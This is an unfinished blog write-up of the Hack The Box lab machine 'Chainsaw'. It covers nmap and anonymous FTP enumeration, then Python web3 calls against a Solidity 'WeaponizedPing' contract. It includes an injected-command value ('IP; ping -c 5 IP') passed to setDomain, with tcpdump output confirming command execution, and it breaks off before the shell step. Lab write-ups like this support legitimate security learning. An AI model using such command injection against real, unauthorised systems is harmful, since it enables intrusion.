---
layout: post
title:  "Hack The Box: 'Chainsaw' Writeup"
image: ''
date:   2019-11-23 00:11:43
tags:
- hackthebox
- blockchain
- smart-contracts
- linux
- python
- solidity
- web3
- manual-exploit

description: ''
categories:
- Hack The Box
---

<style>

#myBtn {
  display: none;
  position: fixed;
  bottom: 40px;
  right: 50px;
  z-index: 99;
  font-size: 12px;
  border: 1px solid black;
  outline: black;
  background-color: #262626;
  color: white;
  cursor: pointer;
  padding: 10px 22px 10px 22px;
  border-radius: 10px;
  font-family: 'Open Sans';
}

#myBtn:hover {
  background-color: #5d4d7a;
}

applause-button {
		margin: auto;
	}

	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.fortune-img {
		max-width: 75%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css" />
<script src="/assets/js/applause-button.js"></script>

<img src="/assets/img/writeups/HTB-CHAINSAW/HTB-CHAINSAW-BADGE.PNG" class="chainsaw-img" alt="Hack The Box - Chainsaw">

### Preface

If you find anything in this writeup you feel is inaccurately depicted and/or explained, please reach out to me and let me know! I am always willing to make corrections in order to provide the most accurate information possible, while also taking the opportunity to learn and grow. Thanks!

### Overview

The `Chainsaw` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/41600">artikrh</a> and <a href="https://www.hackthebox.eu/home/users/profile/37317">absolutezero</a>) is a retired 40 point Linux machine. The initial steps require manual exploitation of smart contracts via a few files that can be found in an FTP share with `anonymous` login enabled. Once a shell has been obtained, there is a privilege escalation technique involving the InterPlanetary File System (`IPFS`) which leads to SSH key cracking (and eventually `user.txt`). For root, there is a `setuid elf` binary called `ChainsawClub` which can be exploited in a similar fashion to the first exploit.
<p><br></p>
With all of that being said... Time to get crackin'! 
<p><br></p>

As usual, I started with my initial `nmap` scan for general port discovery and service enumeration.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+[root@kali: HTB-CHAINSAW]$ nmap -p- -sCV -A -Pn 10.10.10.142 > nmap_scan_full_chainsaw.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 13:36 EST
Nmap scan report for 10.10.10.142
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Nov 23 17:17 address.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:25 GMT
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:24 GMT
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 23 Nov 2019 18:37:24 GMT
|_    Connection: close
</code></pre></div></div>

### FTP Enumeration

I immediately noticed there was an FTP server with `anonymous` login allowed, so I checked that first using `ftp`. There were a few files there, so I went ahead and grabbed all of them.

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+[root@kali: HTB-CHAINSAW]$ ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
+ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 Nov 23 17:17 address.txt
226 Directory send OK.
+ftp> mget *
+mget WeaponizedPing.json? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.json (23828 bytes).
226 Transfer complete.
23828 bytes received in 0.04 secs (526.2219 kB/s)
+mget WeaponizedPing.sol? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.sol (243 bytes).
226 Transfer complete.
243 bytes received in 0.00 secs (2.3891 MB/s)
+mget address.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for address.txt (44 bytes).
226 Transfer complete.
44 bytes received in 0.00 secs (343.7500 kB/s)
</code></pre></div></div>

The contents of the files are as follows:

`WeaponizedPing.json`:

```json
+[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.json
{
  "contractName": "WeaponizedPing",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getDomain",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_value",
          "type": "string"
        }
      ],
      "name": "setDomain",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029",
  "deployedBytecode": "0x60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029",
  "sourceMap": "27:210:1:-;;;56:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;27:210;8:9:-1;5:2;;;30:1;27;20:12;5:2;27:210:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;",
  "deployedSourceMap": "27:210:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;166:68;;8:9:-1;5:2;;;30:1;27;20:12;5:2;166:68:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;130:6;153:5;146:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;:::o;166:68::-;223:6;215:5;:14;;;;;;;;;;;;:::i;:::-;;166:68;:::o;27:210::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o",
  "source": "pragma solidity ^0.4.24;\n\n\ncontract WeaponizedPing {\n\n  string store = \"google.com\";\n\n  function getDomain() public view returns (string) {\n      return store;\n  }\n  function setDomain(string _value) public {\n      store = _value;\n  }\n\n}\n\n",
  "sourcePath": "/opt/WeaponizedPing/WeaponizedPing.sol",
  "ast": {
    "absolutePath": "/opt/WeaponizedPing/WeaponizedPing.sol",
    "exportedSymbols": {
      "WeaponizedPing": [
        80
      ]
    },
----------
 Redacted
----------
  "networks": {
    "1543936419890": {
      "events": {},
      "links": {},
      "address": "0xaf6ce61d342b48cc992820a154fe0f533e5e487c",
      "transactionHash": "0x5e94c662f1048fca58c07e16506f1636391f757b07c1b6bb6fbb4380769e99e1"
    }
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-12-04T15:24:57.205Z"
}
```

`WeaponizedPing.sol`:

```javascript
+[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.sol 
pragma solidity ^0.4.24;

contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }

  function setDomain(string _value) public 
  {
      store = _value;
  }
}
```

`address.txt`:

```
0x59573303cEe70289D95660564e6013F3BF55B10f
```

### WeaponizedPing File Contents & Analysis

This appears to be exactly what is needed to produce a smart contract. These smart contracts are written in a language called Solidity -- most people tend to associate it with popular blockchain platforms, such as Ethereum. 
<p><br></p>
The smart contract `WeaponizedPing.sol` appears to have two interesting functions as well, both of which are returning the same value (`store`).
<p><br></p>

The first function is `getDomain()`. It returns the value of `store`, where the value of `store`is set to `google.com`.

```javascript
contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }
```

The second function is `setDomain`, which takes the input of *some string value* (`_value`) and changes the original value of `store` to the new *some string value* (`_value`):

```javascript
  function setDomain(string _value) public 
  {
      store = _value;
  }
```

### Smart Contract Exploit Verification

So from here, I began writing my exploit to try and get an initial shell from the smart contract code already provided.
<p><br></p>
I started by importing required modules with `python`. I initially had to install `web3` 
prior to importing it with python, so I went ahead and did that first:

```python
pip3 install web3
```

I then imported `web3` as it's a required module to interact with the smart contracts, as well as `HTTPProvider`, as I received quite a few HTTP response headers when I ran my initial `nmap` scan, so I figured it would be safe to include at this stage:

```python
from web3 import Web3, HTTPProvider
```

I also imported `json` because it is necessary to import the application binary interface, which happens to be a `json` file (`WeaponizedPing.json`).

```python
import json
```

I then went ahead and specified my first variable, which is `url`. I set `url` to the machine IP with port `9810` appended to it, since this is the port we will be using to communicate with the Ethereum client on:

```python
url = "http://10.10.10.142:9810"
```

Next, I created a `web3` variable to initiate a web connection:

```python
web3 = Web3(Web3.HTTPProvider(url))
```

Finally, I added a `print()` statement to make sure I was connecting properly, which I later removed as it was no longer needed. This step is simply to ensure the connection is being made before moving forward:

```python
+>>> print(web3.isConnected())
True
```

So now that `web3.isConnected()` returned `True`, I began attempting to exploit the service.
<p><br></p>

### Smart Contract Exploitation

I hop into a `python3` window and get started with building my exploit. I begin by assigning the necessary parameters to communicate with the smart contract service:

```python
➜  HTB-CHAINSAW python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
+>>> from web3 import Web3, HTTPProvider
+>>> import json
+>>> 
+>>> # Basic configuration variables related to smart contract verification
+... 
+>>> contract_address = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7'
+>>> contract_data = json.loads(open("WeaponizedPing.json", "r").read())
+>>> abi = contract_data['abi']
+>>> 
+>>> # Connection gets established
+... 
+>>> w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
+>>> w3
<web3.main.Web3 object at 0x7fd66445de90>
```

From here, I can run `+>>> w3.eth.accounts` to achieve this output:

```python
['0x661739A860ca8b1325eA416be0E0342d1990B798', '0xE14A7540Dc365da93226e028f078201b95acbE95', '0x0F49c298997a03F7bf7666Bd05faBa483286F460', '0xC29A0F194b565D6bc20Cf58e5Ef5bB6dec58bF03', '0x5c0Fd628150215AC44eacA004FfB2AAb120035D4', '0x7Ed923F73D8C8b0C7382B871071a4b26F1542799', '0x3ef2DE965A8952e6FF5720458DA6FaDbe3210613', '0x9AA54F55b1510332b798F1cdf8EA7AECf4cB4c1D', '0x534C34980A4Fd8D3eC97850c1D5e7934786E477f', '0x8E267A00719B13a372c12946CF391B247AfB91FE']
```

And this will display all of the available addresses associated with `accounts`. So, for example, I can grab the first one like this:

```python
+>>> w3.eth.accounts[0]
'0x661739A860ca8b1325eA416be0E0342d1990B798'
```

The second one like this:

```python
+>>> w3.eth.accounts[1]
'0xE14A7540Dc365da93226e028f078201b95acbE95'
```

And, you get the point. From here, I went ahead and set my `defaultAccount` to the very first address in the list, like this:

```python
+>>> w3.eth.defaultAccount = w3.eth.accounts[0]
```

Nice – So now, every time I perform a transaction, the address located at `w3.eth.accounts[0]` will be applied as the default sending address (aka, this address --> `0x661739A860ca8b1325eA416be0E0342d1990B798`)
<p><br></p>

This is great and all, but I can't really *call* anything yet. However, this is why I created the `abi` variable. After checking the Solidity documentation, I noticed I needed two things to interact with smart contracts:
<p><br></p>

1) The address of the contract (which I already found in `WeaponizedPing.json`)
2) The `ABI`, or *Application Binary Interface* of the contract
<p><br></p>

This will essentially "load" the API and allow me to interact with it. I can do this by running this command in python:

```python
+>>> contract = w3.eth.contract(abi=abi, address=contract_address)
```

And as you can see, checking the value of `contract ` gives me this result:

```python
+>>> contract
<web3._utils.datatypes.Contract object at 0x7fd664432250>
```

Looking good so far! Now I can try playing with the associated functions from `WeaponizedPing.sol`, which are `getDomain` and `setDomain`:

```python
+>>> contract.functions.getDomain().call()
'google.com'
```

Cool! It gives me the output `google.com`, which is exactly what I would expect, as that was what was already defined in the original source code.
<p><br></p>

So this got me thinking... Instead of using `getDomain()` to retrieve a domain, what if I were to use `setDomain` instead and try to ping myself? So that's exactly what I did.
<p><br></p>

I went ahead and ran `tcpdump` in order to (hopefully) receive a request back to myself via the smart contract exploit.

I ran this command to get `tcpdump` running:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
```

An inferance can be made that, because the original file is called `WeaponizedPing`, it's likely that it will be accessible via ICMP.
<p><br></p>

Anyway, I then ran this command from my `python` prompt to retrieve a response:

```python
+>>> contract.functions.setDomain("10.10.14.34").transact()
HexBytes('0x081c2b06307116751929679abef5cf16a64c3912ee9b6f3cd58eec8bb7731e50')
```

Which returned this output in `tcpdump`:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:14:26.706416 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1837, seq 1, length 64
19:14:26.706444 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1837, seq 1, length 64
```

So I knew I could get a response, but I wanted to verify this one step further.
<p><br></p>

I wanted to know if I could get command execution in a similar fashion. I attempted to do this by `ping`ing myself directly with a similar command. I achieved this by running the same `tcpdump` command, but by changing my original smart contract command to this:

```python
+>>> contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
```

With this command, my `tcpdump` achieved this response:

```python
➜  www tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes

19:22:42.440642 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1844, seq 1, length 64
19:22:42.440670 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1844, seq 1, length 64

19:22:42.484806 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 1, length 64
19:22:42.484837 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 1, length 64

19:22:43.486595 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 2, length 64
19:22:43.486618 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 2, length 64

19:22:44.487996 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 3, length 64
19:22:44.488015 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 3, length 64

19:22:45.489770 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 4, length 64
19:22:45.489808 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 4, length 64

19:22:46.491826 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 5, length 64
19:22:46.491846 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 5, length 64
```

I've broken them up to make it more apparent, but as you can see, there are clearly five (5) responses present here, exactly as I specified with my previous `ping` command.

### Obtaining A Shell

Now that I have crafted a working payload, I can attempt to obtain a shell given what I already know.

### Writeup still in progress... Check back later for more!

<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>